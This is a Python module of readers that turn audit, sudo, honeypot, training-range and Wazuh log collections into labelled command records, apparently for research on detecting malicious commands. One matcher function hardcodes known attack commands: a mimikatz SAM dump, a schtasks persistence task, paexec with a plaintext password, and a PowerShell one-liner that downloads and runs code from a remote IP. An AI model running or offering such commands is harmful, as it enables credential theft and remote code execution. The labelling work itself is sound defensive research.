"""Readers for audit, honeypot, training and Wazuh command collections."""

from __future__ import annotations

import csv
import gzip
import hashlib
import html
import io
import json
import ntpath
import re
import subprocess
import sqlite3
import tempfile
import sys
import zipfile
import zlib
from datetime import datetime
from itertools import islice
from pathlib import Path

import ijson
import openpyxl
from _ingest import Command, normalize, select_files


def emitted(
    text, rid, session, label="unknown", group=None, os="linux", shell=False, pgm=None
):
    """Normalize one observed command, retaining its source and session."""
    for i, (program, args) in enumerate(normalize(text, os=os, shell=shell, pgm=pgm)):
        yield Command(program, args, f"{rid}:{i}", label, group, session, os)


def limited(rows, options):
    """Bound source scanning independently of emitted command count."""
    yield from islice(rows, options.max_records)



def sudo_command_argv(text: str) -> list[str]:
    """Decode sudo eventlog COMMAND serialization once, without shell evaluation.

    Sudo wraps arguments containing spaces in single quotes, escapes quotes
    and backslashes, and writes control bytes as #0nn octal sequences.
    Double quotes remain ordinary argument content.
    """
    words = []
    word = []
    quoted = False
    started = False
    index = 0
    while index < len(text):
        char = text[index]
        if char == "\\" and index + 1 < len(text) and (
            text[index + 1] in "\\'" or text[index + 1].isspace()
        ):
            word.append(text[index + 1])
            started = True
            index += 2
            continue
        # sudo's lbuf.c escape() writes #0 plus one to three octal digits:
        # bell is #07, tab #011, and DEL #0177.
        control = re.match(r"#0([0-7]{1,3})", text[index:]) if char == "#" else None
        if control:
            word.append(chr(int(control[1], 8)))
            started = True
            index += len(control[0])
            continue
        if char == "'":
            quoted = not quoted
            started = True
        elif char.isspace() and not quoted:
            if started:
                words.append("".join(word))
                word = []
                started = False
        else:
            word.append(char)
            started = True
        index += 1
    if started:
        words.append("".join(word))
    return words


def audit_value(value):
    """Decode Linux audit quoted strings and hexadecimal argument values."""
    if value.startswith('"'):
        return value[1:-1]
    if re.fullmatch(r"(?:[0-9A-Fa-f]{2})+", value):
        return bytes.fromhex(value).decode("utf-8", "replace")
    return value


def complete_audit_event(event, entry):
    """Choose the most complete command representation in a joined event."""
    fields, arguments, title, command, line, attack = entry
    if not fields.get("_execution"):
        return None
    argv = []
    if arguments:
        argc = int(fields.get("argc", max(arguments) + 1))
        if all(i in arguments for i in range(argc)):
            argv = [arguments[i] for i in range(argc)]
    if not argv and title:
        argv = title.removesuffix("\0").split("\0") if "\0" in title else []
        if not argv:
            parsed = normalize(title)
            if parsed:
                argv = [parsed[0][0], *parsed[0][1]]
    if not argv and command:
        parsed = normalize(command)
        if parsed:
            argv = [parsed[0][0], *parsed[0][1]]
            fields.pop("exe", None)
    if argv:
        if fields.get("success") in {"no", "0"}:
            fields["exe"] = fields.get("_attempted_path", "")
        return event, fields, argv, line, attack
    return None



def audit_session_id(scope, boot, event_id, fields, processes):
    """Scope native logins or observed process lifetimes to their host and boot.

    Parent sessions are inherited only from an observed live parent. A missing
    parent never creates a shared PID-1/unknown session. Exit records retire PIDs.
    """
    host = fields.get("node") or fields.get("host") or "unknown-host"
    prefix = f"{scope}:{host}:boot:{boot}"
    pid = fields.get("pid", "")
    key = (prefix, pid)
    session = fields.get("ses", "")
    native = session not in {"", "-1", "4294967295", "unset"}
    if native:
        result = f"{prefix}:session:{session}"
    elif pid:
        result = processes.get(key)
        if result is None:
            parent = processes.get((prefix, fields.get("ppid", "")), "")
            result = parent if ":session:" in parent else f"{prefix}:process:{pid}:start:{event_id}"
    else:
        result = f"{prefix}:event:{event_id}"
    if pid:
        processes[key] = result
        syscall = fields.get("syscall", "")
        arch = fields.get("arch", "")
        if syscall in {"exit", "exit_group"} or (arch == "c000003e" and syscall in {"60", "231"}):
            processes.pop(key, None)
        if syscall in {"fork", "vfork", "clone"} or (arch == "c000003e" and syscall in {"56", "57", "58"}):
            child = fields.get("exit", "")
            if child.isdigit() and int(child) > 0:
                processes[(prefix, child)] = result if ":session:" in result else f"{prefix}:process:{child}:start:{event_id}"
    return result


def audit_events(lines, labels=None, *, state=None, scope=""):
    """Join execution companions, including repeated alerts, in a temporary index.

    Titles from unrelated system calls are process observations and never create
    executions. Audit event IDs are scoped by recorded host and boot segment.
    """
    labels = set() if labels is None else labels
    state = {} if state is None else state
    processes = state.setdefault("processes", {})
    scratch = Path(__file__).resolve().parent.parent / "tmp"
    scratch.mkdir(exist_ok=True)
    with tempfile.TemporaryDirectory(prefix="audit-events-", dir=scratch) as temporary:
        with sqlite3.connect(str(Path(temporary) / "events.sqlite")) as db:
            db.execute("CREATE TABLE events (identity TEXT PRIMARY KEY, event TEXT, raw TEXT, first_line INTEGER, attack INTEGER, boot TEXT)")
            boots = state.setdefault("boots", {})
            for number, raw in enumerate(lines, 1):
                text = raw.decode("utf-8", "replace") if isinstance(raw, bytes) else raw
                match = re.search(r"msg=audit\(([^)]+)\)", text)
                if not match:
                    continue
                event = match[1]
                host_match = re.search(r"(?:^|\s)node=(\S+)", text)
                host = host_match[1] if host_match else ""
                if re.search(r"\btype=SYSTEM_BOOT\b", text):
                    boots[(scope, host)] = event
                explicit_boot = re.search(r"\bboot_id=(\S+)", text)
                if explicit_boot:
                    boots[(scope, host)] = explicit_boot[1]
                boot = boots.get((scope, host), "initial")
                identity = json.dumps([host, boot, event])
                db.execute(
                    "INSERT INTO events VALUES (?,?,?,?,?,?) ON CONFLICT(identity) DO UPDATE SET raw=raw || char(10) || excluded.raw, attack=max(attack,excluded.attack)",
                    (identity, event, text.rstrip(), number, int(number in labels), boot),
                )
            for event, raw, number, attack, boot in db.execute("SELECT event,raw,first_line,attack,boot FROM events ORDER BY first_line"):
                entry = [{"_boot": boot}, {}, "", "", number, bool(attack)]
                for text in raw.splitlines():
                    fields = dict(re.findall(r'(?<![\w-])([\w]+)=("[^"]*"|[^\s\']+)', text))
                    entry[0].update(fields)
                    kind = fields.get("type")
                    if kind in {"EXECVE", "USER_CMD"}:
                        entry[0]["_execution"] = True
                    if kind == "SYSCALL":
                        syscall = fields.get("syscall", "").lower()
                        arch = fields.get("arch", "").lower()
                        numbers = {"c000003e": {"59", "322"}, "40000003": {"11", "358"}, "c00000b7": {"221", "281"}, "40000028": {"11", "387"}}
                        if syscall in {"execve", "execveat"} or syscall in numbers.get(arch, set()):
                            entry[0]["_execution"] = True
                    if kind == "PATH" and fields.get("nametype") in {"NORMAL", "CREATE"}:
                        entry[0]["_attempted_path"] = fields.get("name", "")
                    if kind == "EXECVE":
                        if "/" in event:
                            for key, value in re.findall(r"(?<!\S)a(\d+)=(.*?)(?=\s+a\d+=|$)", text.rstrip()):
                                entry[1][int(key)] = value
                        else:
                            for key, value in fields.items():
                                if re.fullmatch(r"a\d+", key):
                                    entry[1][int(key[1:])] = audit_value(value)
                    if kind == "PROCTITLE":
                        if "/" in event:
                            # ausearch -i has already decoded the trailing title.
                            title = re.search(r"\bproctitle=(.*)$", text)
                            entry[2] = title[1].rstrip() if title else ""
                        else:
                            entry[2] = audit_value(fields.get("proctitle", ""))
                    if kind == "USER_CMD":
                        entry[3] = audit_value(fields.get("cmd", ""))
                entry[0]["_session"] = audit_session_id(scope, boot, event, entry[0], processes)
                result = complete_audit_event(event, entry)
                if result:
                    yield result


def audit_rotation_order(name):
    """Read numbered rotations oldest first, followed by the current log."""
    match = re.search(r"(.*\.log)(?:\.(\d+))?(?:\.gz)?$", name)
    return (match[1], -int(match[2] or 0)) if match else (name, 0)


def ait(root, options):
    """Read audit commands and sudo records with per-line attack annotations."""
    audit_state = {}
    for path in select_files(root.glob("*.zip"), options):
        with zipfile.ZipFile(path) as archive:
            members = set(archive.namelist())
            for name in sorted(members, key=audit_rotation_order):
                if not name.startswith("gather/") or name.endswith("/"):
                    continue
                audit = "/logs/audit/audit.log" in name
                auth = "/logs/auth.log" in name
                if not (audit or auth):
                    continue
                labelname = name.replace("gather/", "labels/", 1)
                attacks = set()
                if labelname in members:
                    with archive.open(labelname) as label_stream:
                        for label_line in label_stream:
                            item = json.loads(label_line)
                            if item.get("labels"):
                                attacks.add(int(item["line"]))
                host = name.split("/")[1]
                prefix = f"ait:{path.stem}:{host}"
                with archive.open(name) as raw:
                    stream = gzip.GzipFile(fileobj=raw) if name.endswith(".gz") else raw
                    if audit:
                        for eid, fields, argv, line, attack in audit_events(
                            limited(stream, options), attacks, state=audit_state, scope=prefix
                        ):
                            ses = fields["_session"]
                            program = audit_value(fields.get("exe", "")) or argv[0]
                            # USER_CMD exe describes sudo itself, not the command it runs.
                            if fields.get("type") == "USER_CMD":
                                program = argv[0]
                            yield Command(
                                program,
                                argv[1:],
                                f"{path.name}:{name}:{eid}",
                                "malicious" if attack else "benign",
                                None,
                                ses,
                            )
                    else:
                        for line, rawline in enumerate(limited(stream, options), 1):
                            text = rawline.decode("utf-8", "replace")
                            if "sudo" not in text or "COMMAND=" not in text:
                                continue
                            tty = re.search(r"TTY=([^ ;]+)", text)
                            user = re.search(r"sudo(?:\[\d+\])?:\s*(\S+)", text)
                            day = text[:6]
                            session = (
                                f"{prefix}:{day}:{user[1] if user else '?'}:"
                                f"{tty[1] if tty else '?'}"
                            )
                            command = text.split("COMMAND=", 1)[1].strip()
                            if command == "list":
                                command = "sudo -l"
                            argv = sudo_command_argv(command)
                            if argv:
                                yield Command(
                                    argv[0], argv[1:], f"{path.name}:{name}:{line}:0",
                                    "malicious" if line in attacks else "benign",
                                    session_id=session,
                                )


def kypo(root, options):
    """Parse shell and Metasploit input, grouping by training host and user."""
    with zipfile.ZipFile(root / "data.zip") as archive:
        names = [Path(n) for n in archive.namelist() if n.endswith("useractions.json")]
        for member in select_files(names, options):
            with archive.open(str(member)) as stream:
                for line, raw in enumerate(limited(stream, options), 1):
                    row = json.loads(raw)
                    session = "kypo:" + ":".join(
                        [
                            str(member),
                            str(row.get("hostname", "")),
                            str(row.get("username", "")),
                        ]
                    )
                    yield from emitted(
                        row.get("cmd", ""),
                        f"data.zip:{member}:{line}",
                        session,
                        shell=row.get("cmd_type") == "bash-command",
                    )


def microsoft_iot(root, options):
    """Stream password-protected, aggregated honeypot command sequences."""
    with (
        zipfile.ZipFile(root / "Microsoft.IoT-Dump-pwd-infected.zip") as archive,
        archive.open("Microsoft.IoT-Dump1.json", pwd=b"infected") as raw,
    ):
        stream = io.TextIOWrapper(raw, encoding="utf-8-sig")
        for index, row in enumerate(limited(ijson.items(stream, "item"), options)):
            sequence = str(row.get("ID", index))
            group = "microsoft-iot:" + sequence
            for i, text in enumerate(row["Commands"]):
                yield from emitted(
                    text,
                    f"{sequence}:{i}",
                    group,
                    "malicious-group",
                    group,
                    shell=True,
                )


def gzip_json_items(path, *, allow_truncated=False):
    """Stream complete JSON array items; optionally recover a known truncated gzip.

    read1 delivers decompressed bytes before checking the next gzip block/footer.
    A push parser therefore preserves complete objects in the final short read.
    Syntax errors are always fatal; only EOF from gzip permits partial recovery.
    """
    pending = ijson.sendable_list()
    parser = ijson.items_coro(pending, "item")
    truncated = False
    try:
        with gzip.open(path, "rb") as stream:
            while True:
                try:
                    chunk = stream.read1(64 * 1024)
                except EOFError:
                    if not allow_truncated:
                        raise
                    truncated = True
                    break
                if not chunk:
                    break
                parser.send(chunk)
                yield from pending
                pending.clear()
        try:
            parser.close()
        except ijson.IncompleteJSONError:
            if not truncated:
                raise
        if truncated:
            print(
                f"WARNING: {path}: incomplete publisher archive; retained complete "
                "JSON records and discarded the unfinished final record.",
                file=sys.stderr,
                flush=True,
            )
    except (EOFError, OSError, zlib.error, ijson.JSONError) as error:
        raise ValueError(f"Cannot read {path}: {error}") from error


def known_truncated_cyberlab(path):
    """Recognize the exact corrupt bytes published by Zenodo record 3687527."""
    if path.name != "cyberlab_2020-01-29.json.gz" or path.stat().st_size != 31660520:
        return False
    checksum = hashlib.md5()
    with path.open("rb") as stream:
        while chunk := stream.read(1024 * 1024):
            checksum.update(chunk)
    return checksum.hexdigest() == "7d2b798aa797115d181ae920cca59002"


def cyberlab(root, options):
    """Read Cowrie input; suppress handler echoes when original input exists."""
    for path in select_files(root.glob("*.json.gz"), options):
        rows = gzip_json_items(path, allow_truncated=known_truncated_cyberlab(path))
        for index, obj in enumerate(limited(rows, options)):
            for sid, events in obj.items():
                has_input = any(
                    e.get("eventid") == "cowrie.command.input" for e in events
                )
                for n, event in enumerate(events):
                    kind = event.get("eventid", "")
                    prefixes = {
                        "cowrie.command.input": "CMD: ",
                        "cowrie.command.success": "Command found: ",
                        "cowrie.command.failed": "Command not found: ",
                    }
                    if kind not in prefixes or (
                        has_input and kind != "cowrie.command.input"
                    ):
                        continue
                    message = event.get("message", "")
                    text = event.get("input") or message.removeprefix(
                        prefixes[kind]
                    )
                    host = (
                        event.get("dst_host_identifier")
                        or event.get("sensor")
                        or ""
                    )
                    session = f"cyberlab:{path.name}:{host}:{sid}"
                    yield from emitted(
                        text,
                        f"{path.name}:{index}:{sid}:{n}",
                        session,
                        "malicious-group",
                        session,
                        shell=True,
                    )


def concatenated_csv(stream):
    """Recover independently headed CSV exports concatenated without newlines."""
    headers: list[str] = []
    for values in csv.reader(stream):
        boundary = next(
            (i for i, value in enumerate(values) if value.strip() == "_index"), None
        )
        if boundary is not None:
            if boundary and headers:
                last = values[boundary].removesuffix("_index")
                yield dict(zip(headers, values[:boundary] + [last]))
            headers = [value.strip() for value in values[boundary:]]
        elif values and headers:
            yield dict(zip(headers, values))


def label_key(timestamp, host, log, description):
    """Use publisher join fields, preserving original timestamps and log text."""
    return tuple(str(x or "").strip() for x in (timestamp, host, log, description))


def linux_apt(root, options):
    """Join the published spreadsheet labels to original Wazuh sudo events."""
    labels: dict[tuple[str, ...], str] = {}
    workbook = openpyxl.load_workbook(
        root / "source/Processed Version.xlsx", read_only=True, data_only=True
    )
    sheet = workbook["combined"]
    rows = sheet.iter_rows(values_only=True)
    headers = [str(x or "").replace("\\", "") for x in next(rows)]
    for values in rows:
        row = dict(zip(headers, values))
        value = row.get("Malicious / General")
        if value not in (0, 1, "0", "1"):
            continue
        key = label_key(
            row.get("timestamp"),
            row.get("agent.name"),
            openpyxl.utils.escape.unescape(str(row.get("full_log") or "")),
            row.get("rule.description"),
        )
        label = "malicious" if str(value) == "1" else "benign"
        labels[key] = label if key not in labels or labels[key] == label else "unknown"
    workbook.close()
    with (root / "source/combine.csv").open(encoding="utf-8-sig", newline="") as stream:
        for index, row in enumerate(limited(concatenated_csv(stream), options), 2):
            command = row.get("_source.data.command", "").strip()
            log = row.get("_source.full_log", "")
            if not command and "COMMAND=" in log and "sudo" in log:
                command = log.split("COMMAND=", 1)[1]
            if command == "list":
                command = "sudo -l"
            if not command and "type=PROCTITLE" not in log and "type=EXECVE" not in log:
                continue
            key = label_key(
                row.get("_source.timestamp"),
                row.get("_source.agent.name"),
                log,
                row.get("_source.rule.description"),
            )
            label = labels.get(key, "unknown")
            day = row.get("_source.timestamp", "").split(" @")[0]
            session = "linux-apt-2024:" + ":".join(
                [
                    row.get("_source.agent.name", ""),
                    day,
                    row.get("_source.data.srcuser", "").strip(),
                    row.get("_source.data.tty", "").strip(),
                ]
            )
            rid = row.get("_index", "") + ":" + row.get("_id", "")
            rid = rid if rid != ":" else f"source/combine.csv:{index}"
            if re.search(r"\btype=[A-Z_]+ msg=audit", log):
                continue
            argv = sudo_command_argv(command)
            if argv:
                yield Command(argv[0], argv[1:], rid + ":0", label, session_id=session)
    attacks = set()
    for eid, fields, argv, _, attack in audit_events(linux_apt_audit_lines(root, options, labels, attacks), attacks, scope="linux-apt-2024"):
        host = fields.get("node", "unknown-host")
        ses = fields["_session"]
        label = "malicious" if attack else fields.get("dataset_label", "unknown")
        yield Command(
            audit_value(fields.get("exe", "")) or argv[0], argv[1:],
            f"source/combine.csv:{host}:{fields['_boot']}:{eid}", label,
            session_id=ses,
        )


def linux_apt_audit_lines(root, options, labels, attacks):
    """Stream all Wazuh copies into the shared audit-event join by host and ID."""
    number = 0
    with (root / "source/combine.csv").open(encoding="utf-8-sig", newline="") as stream:
        for row in limited(concatenated_csv(stream), options):
            log = row.get("_source.full_log", "")
            if not re.search(r"\btype=[A-Z_]+ msg=audit", log):
                continue
            label = labels.get(label_key(row.get("_source.timestamp"), row.get("_source.agent.name"), log, row.get("_source.rule.description")), "unknown")
            for fragment in re.split(r" (?=type=[A-Z_]+ msg=audit)", log):
                number += 1
                if label == "malicious":
                    attacks.add(number)
                yield f"node={row.get('_source.agent.name', 'unknown-host')} dataset_label={label} " + fragment


def decode_windows_apt_field(raw: str, *, json_contents: bool, html_entities: bool) -> str:
    """Decode the CSV field's known export layers once, preserving malformed JSON."""
    if json_contents:
        try:
            raw = json.loads('"' + raw + '"')
        except json.JSONDecodeError:
            pass
    return html.unescape(raw) if html_entities else raw


def windows_apt(root, options):
    """Read native process launch command lines and process inventory arguments."""
    with (root / "source/combined.csv").open(
        encoding="utf-8-sig", newline=""
    ) as stream:
        for index, row in enumerate(limited(csv.DictReader(stream), options), 2):
            prefix = "_source.data.win.eventdata."
            command = row.get(prefix + "commandLine", "").strip()
            os = "windows"
            image = row.get(prefix + "image", "").strip()
            label = "unknown"
            if command:
                techniques = row.get("_source.rule.mitre.id", "").strip()
                if re.search(r"\bT\d{4}(?:\.\d{3})?\b", techniques) or row.get("_source.rule.id", "").strip() in {"92031", "92039", "92052", "92066"}:
                    label = "malicious"
                command = decode_windows_apt_field(command, json_contents=True, html_entities=True)
                image = decode_windows_apt_field(image, json_contents=True, html_entities=True)
            else:
                # Inventory fields are ordinary CSV text, without the Sysmon JSON layer.
                image = row.get("_source.data.process.cmd", "").strip()
                arguments = row.get("_source.data.process.args", "").strip()
                if not image or not arguments:
                    continue
                os = "linux" if image.startswith("/") else "windows"
                command = f'"{image}" {arguments}'
            host = (
                row.get("_source.data.win.system.computer", "").strip()
                or row.get("_source.agent.name", "").strip()
            )
            guid = row.get(prefix + "logonGuid", "").strip()
            if not guid or not guid.strip("{}0-"):
                guid = ":".join(
                    [
                        row.get("_source.timestamp", "").split(" @")[0],
                        row.get(prefix + "logonId", "").strip()
                        or row.get("_source.data.process.session", "").strip()
                        or row.get("_source.data.process.ppid", "").strip()
                        or str(index),
                    ]
                )
            rid = row.get("_index", "") + ":" + row.get("_id", "")
            yield from emitted(
                command,
                rid if rid != ":" else f"source/combined.csv:{index}",
                f"windows-apt-2025:{host}:{guid}",
                label=label,
                os=os,
                pgm=image or None,
            )


def _publicarena_attack(config, text):
    parsed = normalize(text, os="windows")
    if not parsed:
        return False
    program, args = parsed[0]
    program = ntpath.basename(program).lower().removesuffix(".exe")
    step = Path(config).stem
    if step == "F12":
        return program == "mimikatz" and args == ["lsadump:sam"]
    if step == "F5":
        return program == "schtasks" and args == ["/create", "/tn", "test", "/tr", r"C:\Users\Public\logic.exe", "/sc", "onlogon"]
    prefix = [r"\192.168.0.110", "-u", "administrator", "-p", "Data123456!"]
    if step == "F15onHostA-paexecip":
        return program == "paexec" and args == [*prefix, "ipconfig"]
    if step == "F16onHostA-paexecdown":
        return program == "paexec" and args == [*prefix, "powershell.exe", "-nop", "-w", "hidden", "-c", "IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8900/a'))"]
    return False


def publicarena(root, options):
    """Stream split archives through 7-Zip and match attack-step time windows."""
    truth = []
    for path in sorted((root / "source/SystemAuditLogs/GroundTruth").rglob("*.config")):
        sections = path.read_text(encoding="utf-8-sig").split("[PName]")
        times = sections[0].replace("[occurTime]", "").strip().splitlines()
        if len(sections) != 2 or len(times) < 2:
            continue
        # Publisher timestamps are local wall times without a specified timezone.
        start, end = [
            datetime.strptime(t.strip(), "%m/%d/%Y %H:%M:%S")  # noqa: DTZ007
            for t in times[:2]
        ]
        host = "B" if path.name.startswith("E") or "onHostB" in path.name else "A"
        truth.append(
            (
                host,
                start,
                end,
                {
                    n.strip().lower().removesuffix(".exe")
                    for n in sections[1].splitlines()
                    if n.strip()
                },
                str(path.relative_to(root)),
            )
        )
    for path in select_files((root / "source/SystemAuditLogs").rglob("*.zip"), options):
        listing = subprocess.run(
            ["7z", "l", "-slt", str(path)], check=True, capture_output=True, text=True
        ).stdout
        names = re.findall(r"^Path = (.+\.json)$", listing, re.MULTILINE)
        for name in names:
            proc = subprocess.Popen(
                ["7z", "x", "-so", str(path), name],
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
            )
            assert proc.stdout is not None
            try:
                for index, line in enumerate(limited(proc.stdout, options), 1):
                    row = json.loads(line)
                    if row.get("EventName") != "Process/Start" or not row.get(
                        "CommandLine"
                    ):
                        continue
                    host = "B" if "HostB" in name else "A"
                    label, group = (
                        ("benign", None)
                        if "benign" in name.lower()
                        else ("unknown", None)
                    )
                    # Match the same unzoned local wall times used by the attack configs.
                    date = datetime.strptime(row["date"], "%m/%d/%Y %H:%M:%S")  # noqa: DTZ007
                    pname = str(row.get("PName", "")).lower().removesuffix(".exe")
                    text = html.unescape(row["CommandLine"]).replace("\\\\", "\\")
                    for target, start, end, programs, config in truth:
                        if (
                            target == host
                            and start <= date <= end
                            and pname in programs
                        ):
                            label, group = (
                                "malicious-group",
                                f"publicarena:{host}:{config}",
                            )
                            if _publicarena_attack(config, text):
                                label, group = "malicious", None
                            break
                    session = (
                        f"publicarena:{path.stem}:{row.get('pc', host)}:"
                        f"{date.date()}:{row.get('SessionID', 'unknown')}"
                    )
                    rid = f"{path.name}:{name}:{row.get('uuid', index)}"
                    yield from emitted(
                        text,
                        rid,
                        session,
                        label,
                        group,
                        os="windows",
                    )
                if options.max_records is None:
                    code = proc.wait()
                    if code:
                        raise RuntimeError(f"7z failed ({code}) reading {path}:{name}")
            finally:
                if proc.poll() is None:
                    proc.kill()
                proc.wait()
                proc.stdout.close()


READERS = {
    "ait": ait,
    "cyberlab": cyberlab,
    "kypo": kypo,
    "microsoft-iot": microsoft_iot,
    "linux-apt-2024": linux_apt,
    "windows-apt-2025": windows_apt,
    "publicarena": publicarena,
}
